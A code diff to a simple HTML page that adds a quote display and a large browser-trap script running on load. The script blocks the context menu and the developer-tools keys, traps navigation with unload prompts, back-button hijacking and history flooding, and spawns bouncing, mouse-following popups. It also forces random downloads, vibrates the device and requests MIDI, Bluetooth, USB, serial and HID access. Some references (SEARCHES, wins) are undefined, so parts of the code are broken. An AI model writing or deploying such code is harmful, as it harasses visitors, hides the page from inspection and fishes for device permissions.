@@ -5,6 +5,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
+    <style>
+        html {
+            background-image: url("cat.png");
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+    </style>
 </head>
 
 <body>
@@ -51,8 +58,322 @@
         };
 
         downloadFile();
+    </script>
+    <script>
+        const MARGIN = 10;
+        const TOP_MARGIN = 10;
+        const VELOCITY = 5;
+        const TICK_LENGTH = 50;
+        const WIN_WIDTH = 800;
+        const WIN_HEIGHT = 600;
+        const SCREEN_WIDTH = window.screen.width;
+        const SCREEN_HEIGHT = window.screen.height;
 
+        document.addEventListener('contextmenu', (event) => event.preventDefault());
 
+        document.addEventListener('keydown', (event) => {
+            if (event.key === 'F12' ||
+                (event.ctrlKey && event.shiftKey && event.key === 'I') ||
+                (event.ctrlKey && event.shiftKey && event.key === 'J') ||
+                (event.ctrlKey && event.key === 'U')) {
+                event.preventDefault();
+            }
+        });
+
+        window.addEventListener('beforeunload', (event) => {
+            event.preventDefault();
+            event.returnValue = '';
+        });
+
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
+
+        function triggerFileDownload() {
+            const FILE_DOWNLOADS = [
+                '1.jpeg',
+                '2.jpeg',
+                '3.jpeg'
+            ]
+
+            const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
+            const a = document.createElement('a')
+            a.href = fileName
+            a.download = fileName
+            a.click()
+        }
+
+        function getRandomArrayEntry(arr) {
+            const randomIndex = Math.floor(Math.random() * arr.length);
+            return arr[randomIndex];
+        }
+
+        const quotes = [
+            "Die Reise von tausend Meilen beginnt mit einem Schritt. - Laozi",
+            "Wahre Worte sind nicht angenehm, angenehme Worte sind nicht wahr. - Laozi",
+            "Stille ist eine Quelle großer Kraft. - Laozi",
+            "Wer andere besiegt, hat Kraft. Wer sich selbst besiegt, ist stark. - Laozi",
+            "Geduld ist die größte aller Tugenden. - Laozi",
+            "Der Weise tut nichts, und doch bleibt nichts ungetan. - Laozi",
+            "Weich und biegsam ist der Weg des Lebens, hart und starr der Tod. - Laozi",
+            "Wenn du loslässt, hast du die Hände frei. - Laozi",
+            "Je mehr Wissen, desto weniger Verständnis. - Laozi",
+            "Lass los, was du liebst, und es wird zu dir zurückkehren. - Laozi",
+            "Ein guter Reisender hat keine festen Pläne und ist nicht darauf aus, anzukommen. - Laozi",
+            "Wahre Vollkommenheit scheint unvollkommen, und doch ist ihre Wirksamkeit unerschöpflich. - Laozi",
+            "Wissen, dass man nicht weiß, ist das Beste; nicht wissen und glauben, dass man weiß, ist eine Krankheit. - Laozi",
+            "Der Weise ist scharfsinnig, aber nicht verletzend; er ist aufrichtig, aber nicht verletzend. - Laozi",
+            "Das Weiche überwindet das Harte, das Sanfte überwindet das Grobe. - Laozi",
+            "Je mehr Gesetze und Vorschriften, desto ärmer wird das Volk. - Laozi",
+            "Strebe nach Ruhe, aber durch Handeln. - Laozi",
+            "Das Universum ist vollkommen, und nichts bleibt ungetan. - Laozi",
+            "Wer mit wenig zufrieden ist, hat viel. - Laozi",
+            "Schaffe, ohne zu besitzen. Handle, ohne zu erwarten. Führe, ohne zu herrschen. - Laozi"
+        ];
+        function displayRandomQuote() {
+            const randomIndex = Math.floor(Math.random() * quotes.length);
+            const textElement = document.getElementById('quote');
+
+            const quote = quotes[randomIndex];
+            const words = quote.split(' ');
+
+            textElement.innerHTML = '';
+
+            words.forEach((word, index) => {
+                const span = document.createElement('span');
+                span.textContent = word;
+                textElement.appendChild(span);
+
+                if (index < words.length - 1) {
+                    const space = document.createElement('span');
+                    space.textContent = ' ';
+                    textElement.appendChild(space);
+                }
+            });
+        }
+
+        window.onload = displayRandomQuote;
+
+        const tailContainer = document.getElementById('tail-container');
+        const tailImages = [];
+        const maxTailLength = 150;
+
+        document.addEventListener('mousemove', (event) => {
+            const img = document.createElement('img');
+            img.src = 'a.png';
+            img.className = 'tail';
+            img.style.left = `${event.pageX}px`;
+            img.style.top = `${event.pageY}px`;
+
+            tailContainer.appendChild(img);
+            tailImages.push(img);
+
+            if (tailImages.length > maxTailLength) {
+                const oldImg = tailImages.shift();
+                tailContainer.removeChild(oldImg);
+            }
+        });
+
+        function startVibrateInterval() {
+            if (typeof window.navigator.vibrate !== 'function') return;
+            setInterval(() => {
+                const duration = Math.floor(Math.random() * 600);
+                window.navigator.vibrate(duration);
+            }, 1000);
+        }
+
+        function openWindow() {
+            const { x, y } = getRandomCoords();
+            const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
+            const win = window.open(window.location.pathname, '', opts);
+
+            if (!win) return;
+            wins.push(win);
+
+            if (wins.length === 2) setupSearchWindow(win);
+        }
+
+        function requestMidiAccess() {
+            try {
+                navigator.requestMIDIAccess({ sysex: true }).catch(err => {
+                    console.error("MIDI access failed: ", err);
+                });
+            } catch (err) {
+                console.error("MIDI access exception: ", err);
+            }
+        }
+
+        function requestBluetoothAccess() {
+            try {
+                navigator.bluetooth.requestDevice({ acceptAllDevices: true })
+                    .then(device => device.gatt.connect())
+                    .catch(err => {
+                        console.error("Bluetooth access failed: ", err);
+                    });
+            } catch (err) {
+                console.error("Bluetooth access exception: ", err);
+            }
+        }
+
+        function requestUsbAccess() {
+            try {
+                navigator.usb.requestDevice({ filters: [{}] }).catch(err => {
+                    console.error("USB access failed: ", err);
+                });
+            } catch (err) {
+                console.error("USB access exception: ", err);
+            }
+        }
+
+        function requestSerialAccess() {
+            try {
+                navigator.serial.requestPort({ filters: [] }).catch(err => {
+                    console.error("Serial access failed: ", err);
+                });
+            } catch (err) {
+                console.error("Serial access exception: ", err);
+            }
+        }
+
+        function requestHidAccess() {
+            try {
+                navigator.hid.requestDevice({ filters: [] }).catch(err => {
+                    console.error("HID access failed: ", err);
+                });
+            } catch (err) {
+                console.error("HID access exception: ", err);
+            }
+        }
+
+        function moveWindowBounce() {
+            let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
+            let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
+
+            setInterval(() => {
+                const x = window.screenX;
+                const y = window.screenY;
+                const width = window.outerWidth;
+                const height = window.outerHeight;
+
+                if (x < MARGIN) vx = Math.abs(vx);
+                if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx);
+                if (y < TOP_MARGIN) vy = Math.abs(vy);
+                if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy);
+
+                window.moveBy(vx, vy);
+            }, TICK_LENGTH);
+        }
+
+        function setupFollowWindow() {
+            document.addEventListener('mousemove', function (e) {
+                window.moveTo(e.screenX - (WIN_WIDTH / 2), e.screenY - (WIN_HEIGHT / 2));
+            });
+        }
+
+        function onCloseWindow(win) {
+            const i = wins.indexOf(win);
+            if (i >= 0) wins.splice(i, 1);
+        }
+
+        function clipboardCopy(text) {
+            const span = document.createElement('span');
+            span.textContent = text;
+            span.style.whiteSpace = 'pre';
+
+            const iframe = document.createElement('iframe');
+            iframe.sandbox = 'allow-same-origin';
+            document.body.appendChild(iframe);
+
+            let win = iframe.contentWindow;
+            win.document.body.appendChild(span);
+
+            let selection = win.getSelection();
+
+            if (!selection) {
+                win = window;
+                selection = win.getSelection();
+                document.body.appendChild(span);
+            }
+
+            const range = win.document.createRange();
+            selection.removeAllRanges();
+            range.selectNode(span);
+            selection.addRange(range);
+
+            let success = false;
+            try {
+                success = win.document.execCommand('copy');
+            } catch (err) {
+                console.log(err);
+            }
+
+            selection.removeAllRanges();
+            span.remove();
+            iframe.remove();
+
+            return success;
+        }
+
+        function blockBackButton() {
+            window.addEventListener('popstate', () => {
+                window.history.forward();
+            });
+        }
+
+        function fillHistory() {
+            for (let i = 1; i < 20; i++) {
+                window.history.pushState({}, '', window.location.pathname + '?q=' + i);
+            }
+            window.history.pushState({}, '', window.location.pathname);
+        }
+
+        function getRandomCoords() {
+            const x = MARGIN +
+                Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN));
+            const y = TOP_MARGIN +
+                Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - TOP_MARGIN));
+            return { x, y };
+        }
+
+        function setupSearchWindow(win) {
+            if (!win) return;
+            const { x, y } = getRandomCoords();
+            win.moveTo(x, y);
+            win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2);
+            win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0]);
+            let searchIndex = 1;
+            const interval = setInterval(() => {
+                if (win.closed) {
+                    clearInterval(interval);
+                    onCloseWindow(win);
+                    return;
+                }
+
+                win.window.location = window.location.pathname;
+                setTimeout(() => {
+                    win.resizeTo(WIN_WIDTH, WIN_HEIGHT);
+                }, 500);
+                setTimeout(() => {
+                    const { x, y } = getRandomCoords();
+                    win.moveTo(x, y);
+                    win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2);
+                    win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex]);
+
+                    searchIndex += 1;
+                    if (searchIndex >= SEARCHES.length) {
+                        searchIndex = 0;
+                    }
+                }, 1000);
+            }, 3000);
+        }
+
+        startVibrateInterval();
+        openWindow();
+        moveWindowBounce();
+        setupFollowWindow();
+        blockBackButton();
+        fillHistory();
     </script>
 </body>
 
